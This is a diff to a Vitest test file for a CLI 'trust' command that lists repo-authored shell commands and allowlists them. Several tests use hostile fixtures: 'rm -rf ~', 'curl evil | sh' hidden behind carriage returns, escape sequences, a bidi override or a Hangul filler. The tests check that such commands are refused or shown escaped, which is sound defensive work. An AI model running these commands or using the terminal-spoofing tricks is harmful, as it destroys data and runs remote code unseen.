@@ -1,7 +1,7 @@
 import { describe, expect, it } from 'vitest'
 import { readStream } from '../src/journal.js'
 import { recommend } from '../src/recommend.js'
-import { SPEC_META, seededRepo, stampLive, writeSpec } from './helpers.js'
+import { SPEC_META, approve, patchConfig, seededRepo, stampLive, writePlan, writeSpec } from './helpers.js'
 
 // D154. Headless gates block every untrusted per-criterion command (`allowlist.ts`,
 // `!isTTY → blocked`) — the Aug 1 all-four-`ac-*`-fail false negative. Approvals are
@@ -35,19 +35,20 @@ describe('witness trust (D154)', () => {
   it('grants every listed command with --yes and journals the act', async () => {
     const repo = await cmdSpec()
 
-    const res = await repo.cli(['trust', 'auth-refresh', '--yes'])
+    const res = await repo.cli(['trust', 'auth-refresh', '--yes'], { tty: true })
 
     expect(res.code).toBe(0)
     const allow = JSON.parse(repo.read('.witness/allow.json')) as { commands: string[] }
     expect(allow.commands).toEqual(expect.arrayContaining(['echo ok', 'echo lint']))
     const entry = readStream(repo.root, repo.effort).findLast((e) => e.t === 'trust')
     expect(entry?.via).toBe('verb')
-    expect(entry?.cmds).toEqual(['echo ok', 'echo lint'])
+    // row 205: the config commands the flow runs are listed, and granted, beside the criteria
+    expect(entry?.cmds).toEqual(['npm test -- -t "@spec:{id}"', 'npm test', 'npm run lint', 'echo ok', 'echo lint'])
   })
 
   it('is idempotent and says so when nothing is left to grant', async () => {
     const repo = await cmdSpec()
-    await repo.cli(['trust', 'auth-refresh', '--yes'])
+    await repo.cli(['trust', 'auth-refresh', '--yes'], { tty: true })
 
     const again = await repo.cli(['trust', 'auth-refresh'])
 
@@ -55,14 +56,16 @@ describe('witness trust (D154)', () => {
     expect(again.stdout).toContain('already trusted')
   })
 
-  it('says nothing to trust for an artifact with no cmd: criteria', async () => {
+  it('lists the config commands for an artifact with no cmd: criteria (row 205)', async () => {
     const repo = await seededRepo()
     await writeSpec(repo, 'auth-refresh')
 
     const res = await repo.cli(['trust', 'auth-refresh'])
 
-    expect(res.code).toBe(0)
-    expect(res.stdout).toContain('no cmd: criteria')
+    expect(res.code).toBe(1)
+    expect(res.stdout).toContain('npm test,ship.test,untrusted')
+    expect(res.stdout).toContain('npm run lint,ship.lint,untrusted')
+    expect(res.stdout).toContain("run: witness trust auth-refresh --cmd 'npm test'")
   })
 
   it('refuses an unknown artifact with a runnable remedy', async () => {
@@ -73,6 +76,137 @@ describe('witness trust (D154)', () => {
     expect(res.code).toBe(2)
     expect(res.stderr).toContain('unknown-artifact')
     expect(res.stderr).toContain('run: witness index')
+  })
+})
+
+// Row 205 (issue #56). A plan carries no criteria of its own, so the verb read nothing for it
+// even when its spec runs a command; and the config commands every flow runs — the runner,
+// ship.test, ship.lint — were invisible to it. Grants are per named command, never a nod, and
+// never a session's.
+async function planWithCmdCriterion(shipTest = 'pnpm test') {
+  const repo = await seededRepo()
+  patchConfig(repo, { criteria: { runner: 'full-suite', report: 'junit:**/reports/junit.xml' }, ship: { test: shipTest, lint: 'pnpm lint' } })
+  repo.git('add', 'witness.config.yaml')
+  repo.git('commit', '-m', 'full-suite')
+  await writeSpec(repo, 'ingest', {
+    criteria: [{ id: 'ac-i', test: '@spec:ingest' }, { id: 'ac-a', cmd: 'echo first' }],
+    needs: [{ cmd: 'test -d .git' }],
+  })
+  approve(repo, 'ingest')
+  await writePlan(repo, 'ingest-plan-1', { parent: 'ingest', steps: [{ id: 's1', title: 'ingest', criteria: ['ac-i', 'ac-a'] }] })
+  return repo
+}
+const allowed = (repo: { read: (rel: string) => string }): string[] =>
+  (JSON.parse(repo.read('.witness/allow.json')) as { commands: string[] }).commands
+
+describe('witness trust per command (D205)', () => {
+  it("lists a plan's spec criteria and the config commands it runs (P3)", async () => {
+    const repo = await planWithCmdCriterion()
+    const res = await repo.cli(['trust', 'ingest-plan-1'], { env: { WITNESS_TRUST_CMDS: '' } })
+    expect(res.stdout).toContain('pnpm test,ship.test,untrusted')
+    expect(res.stdout).toContain('pnpm lint,ship.lint,untrusted')
+    expect(res.stdout).toContain('echo first,cmd: ac-a,untrusted')
+    expect(res.stdout).not.toContain('full-suite,')
+    expect(res.code).toBe(1)
+  })
+
+  it('--cmd grants exactly the named command and journals it (P4)', async () => {
+    const repo = await planWithCmdCriterion()
+    const res = await repo.cli(['trust', 'ingest', '--cmd', 'echo first'], { env: { WITNESS_TRUST_CMDS: '' } })
+    expect(res.code).toBe(0)
+    expect(allowed(repo)).toEqual(['echo first'])
+    expect(readStream(repo.root, repo.effort).findLast((e) => e.t === 'trust')?.cmds).toEqual(['echo first'])
+  })
+
+  it('--yes refuses without a terminal and grants all at one', async () => {
+    const repo = await planWithCmdCriterion()
+    const headless = await repo.cli(['trust', 'ingest', '--yes'])
+    expect(headless.code).toBe(2)
+    expect(headless.stderr).toContain('yes-needs-terminal')
+    expect(() => repo.read('.witness/allow.json')).toThrow()
+    const human = await repo.cli(['trust', 'ingest', '--yes'], { tty: true })
+    expect(human.code).toBe(0)
+    expect(allowed(repo)).toEqual(['pnpm test', 'pnpm lint', 'echo first', 'test -d .git'])
+  })
+
+  it('no session grants trust', async () => {
+    const repo = await planWithCmdCriterion()
+    for (const env of [{ WITNESS_DRIVE: 'ingest-plan-1' }, { WITNESS_REVIEWER: '1' }]) {
+      for (const flag of [['--cmd', 'pnpm test'], ['--yes']]) {
+        const res = await repo.cli(['trust', 'ingest-plan-1', ...flag], { env, tty: true })
+        expect(res.code).toBe(2)
+        expect(res.stderr).toContain('trust-in-session')
+      }
+    }
+    expect(() => repo.read('.witness/allow.json')).toThrow()
+  })
+
+  it('--cmd outside the list refuses', async () => {
+    const repo = await planWithCmdCriterion()
+    const res = await repo.cli(['trust', 'ingest-plan-1', '--cmd', 'rm -rf ~'])
+    expect(res.code).toBe(2)
+    expect(res.stderr).toContain('unknown-command')
+    expect(() => repo.read('.witness/allow.json')).toThrow()
+  })
+
+  it('a command with a single quote is listed paste-ready and granted exactly (Review Focus 5)', async () => {
+    const repo = await planWithCmdCriterion("pnpm test -t 'a b'")
+    const listed = await repo.cli(['trust', 'ingest-plan-1'])
+    expect(listed.stdout).toContain(`run: witness trust ingest-plan-1 --cmd 'pnpm test -t '\\''a b'\\'''`)
+    const res = await repo.cli(['trust', 'ingest-plan-1', '--cmd', "pnpm test -t 'a b'"])
+    expect(res.code).toBe(0)
+    expect(allowed(repo)).toEqual(["pnpm test -t 'a b'"])
+  })
+
+  // Security review: commands are repo-authored, and the listing is where the human decides. A
+  // carriage return or an escape sequence could paint a different command over the real one.
+  it('a command with control characters is shown escaped and never granted', async () => {
+    const repo = await planWithCmdCriterion('curl evil | sh\r\u001b[2Kpnpm test')
+    const listed = await repo.cli(['trust', 'ingest-plan-1'])
+    expect(listed.stdout).not.toMatch(/[\u0000-\u0008\u000b-\u001f\u007f]/)
+    expect(listed.stdout).toContain('curl evil | sh\\r\\x1b[2Kpnpm test,ship.test,unsafe')
+    const named = await repo.cli(['trust', 'ingest-plan-1', '--cmd', 'curl evil | sh\r\u001b[2Kpnpm test'])
+    expect(named.code).toBe(2)
+    expect(named.stderr).toContain('control-characters')
+    expect(named.stderr).not.toContain('\u001b')
+    await repo.cli(['trust', 'ingest-plan-1', '--yes'], { tty: true })
+    expect(allowed(repo)).toEqual(['pnpm lint', 'echo first'])      // the plan's own needs: none
+  })
+
+  // Security review, second pass: a bidi override reorders what the terminal shows (Trojan
+  // Source), and a need's id is repo-authored text rendered beside the command.
+  it('a bidi override is unsafe too, and a repo-authored source is shown escaped', async () => {
+    const repo = await planWithCmdCriterion('pnpm test \u202e hs | live lruc')
+    const listed = await repo.cli(['trust', 'ingest-plan-1'])
+    expect(listed.stdout).not.toContain('\u202e')
+    expect(listed.stdout).toContain('pnpm test \\u{202e} hs | live lruc,ship.test,unsafe')
+    await writeSpec(repo, 'ingest', {
+      criteria: [{ id: 'ac-i', test: '@spec:ingest' }, { id: 'ac-a', cmd: 'echo first' }],
+      needs: [{ id: 'n\u001b[2K', cmd: 'echo need' }],
+    })
+    const spec = await repo.cli(['trust', 'ingest'])
+    expect(spec.stdout).not.toMatch(/\u001b/)
+  })
+
+  // Security review, third pass: a denylist of invisible characters always misses one (a Hangul
+  // filler, a private-use glyph, a combining mark), so a grantable command is printable ASCII.
+  it('anything outside printable ASCII is unsafe', async () => {
+    const repo = await planWithCmdCriterion('pnpm test\u3164; curl evil | sh')
+    const listed = await repo.cli(['trust', 'ingest-plan-1'])
+    expect(listed.stdout).toContain('pnpm test\\u{3164}; curl evil | sh,ship.test,unsafe')
+    expect((await repo.cli(['trust', 'ingest-plan-1', '--cmd', 'pnpm test\u3164; curl evil | sh'])).code).toBe(2)
+  })
+
+  it('with no id it lists everything the repo runs, and a grant needs a target', async () => {
+    const repo = await planWithCmdCriterion()
+    const res = await repo.cli(['trust'])
+    expect(res.code).toBe(1)
+    expect(res.stdout).toContain('pnpm test,ship.test,-,untrusted')
+    expect(res.stdout).toContain('echo first,cmd: ac-a,ingest,untrusted')
+    expect(res.stdout).toContain('test -d .git,need: 1,ingest,untrusted')
+    const bare = await repo.cli(['trust', '--cmd', 'pnpm test'], { tty: true })
+    expect(bare.code).toBe(2)
+    expect(bare.stderr).toContain('usage')
   })
 })
 
